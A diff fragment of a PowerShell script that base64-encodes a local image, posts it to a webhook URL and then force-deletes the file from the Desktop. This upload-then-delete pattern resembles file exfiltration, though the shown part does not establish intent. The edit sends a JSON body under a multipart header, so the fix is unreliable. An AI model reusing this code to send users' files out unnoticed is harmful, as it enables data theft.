@@ -310,15 +310,22 @@ $fileData = [Convert]::ToBase64String($fileContent)
 $fileType = "image/jpeg"
 $fileName = "kaas.jpg"
 
+# The key should be "file" instead of "value" for the content
 $body = @{
     file = @{
-        value = $fileData
+        file = $fileData
         type = $fileType
         name = $fileName
     }
 } | ConvertTo-Json
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+# Add headers for multipart/form-data content type
+$headers = @{
+    "Content-Type" = "multipart/form-data"
+}
+
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -Headers $headers
+
 
 # Delete the file from the Desktop
 Remove-Item -Path "kaas.jpg" -Force
